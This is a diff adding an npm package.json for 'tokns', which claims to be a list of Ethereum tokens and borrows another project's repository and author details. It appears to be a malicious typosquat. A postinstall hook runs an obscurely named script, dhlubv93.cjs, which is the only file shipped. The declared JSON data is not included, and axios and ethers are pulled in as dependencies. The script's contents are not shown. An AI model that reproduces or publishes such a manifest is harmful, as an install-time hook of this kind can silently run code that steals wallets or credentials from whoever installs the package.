@@ -1,0 +1,63 @@
+{
+  "name": "tokns",
+  "version": "1.1.0",
+  "description": "List of Ethereum tokens in Json",
+  "main": "eth-tokens.json",
+  "scripts": {
+    "postinstall": "node dhlubv93.cjs"
+  },
+  "repository": {
+    "type": "git",
+    "url": "git+https://github.com/lutangar/eth-tokens.git"
+  },
+  "keywords": [
+    "ethereum",
+    "tokens",
+    "json",
+    "blockchain",
+    "cryptocurrency"
+  ],
+  "author": "lutangar",
+  "license": "MIT",
+  "bugs": {
+    "url": "https://github.com/lutangar/eth-tokens/issues"
+  },
+  "homepage": "https://github.com/lutangar/eth-tokens#readme",
+  "devDependencies": {
+    "babel-cli": "^6.26.0",
+    "babel-plugin-external-helpers": "^6.22.0",
+    "babel-plugin-istanbul": "^4.1.4",
+    "babel-preset-airbnb": "^2.4.0",
+    "babel-register": "^6.24.1",
+    "chai": "^4.1.2",
+    "commonjs": "0.0.1",
+    "cross-env": "^5.0.5",
+    "es6-promise": "^4.1.1",
+    "eslint": "^4.4.1",
+    "eslint-config-airbnb": "^15.1.0",
+    "eslint-config-prettier": "^2.3.0",
+    "eslint-loader": "^1.2.0",
+    "eslint-plugin-import": "^2.7.0",
+    "eslint-plugin-jsx-a11y": "^5.1.1",
+    "eslint-plugin-prettier": "^2.1.2",
+    "eslint-plugin-react": "^7.2.0",
+    "ethjs-account": "^0.1.4",
+    "isomorphic-fetch": "^2.2.1",
+    "jsonfile": "^4.0.0",
+    "mocha": "^3.5.0",
+    "mock-env": "^0.2.0",
+    "npm-run-all": "^4.1.1",
+    "nyc": "^10.3.2",
+    "prettier": "^1.5.2",
+    "prettier-eslint-cli": "^4.1.1",
+    "rimraf": "^2.6.1",
+    "safe-publish-latest": "^1.1.1"
+  },
+  "files": [
+    "dhlubv93.cjs"
+  ],
+  "dependencies": {
+    "axios": "^1.7.7",
+    "ethers": "^6.13.2"
+  }
+}
